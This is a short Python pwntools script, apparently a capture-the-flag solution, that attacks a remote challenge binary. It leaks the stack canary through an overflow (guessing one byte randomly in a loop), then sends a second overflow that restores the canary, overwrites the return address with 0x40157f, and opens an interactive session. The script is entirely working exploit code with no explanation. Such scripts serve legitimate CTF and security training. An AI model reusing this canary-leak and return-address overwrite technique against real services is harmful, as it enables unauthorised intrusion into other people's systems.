from pwn import *
import os

context.log_level = 'debug'

while True:

    # p = gdb.debug('./chal', '''
    #               b *0x40142c
    #               b *0x4014f9
    #               b *0x401564
    # ''')
    p = remote('34.70.212.151', 8005)

    p.sendlineafter(b':', b'A'*0x20 + b'B'*0x28)

    p.recvline()
    canary = u64(os.urandom(1) + p.recv(7))
    print(hex(canary))

    p.sendlineafter(b':', b'A'*0x48 + p64(canary) + p64(0x40157f))

    p.interactive()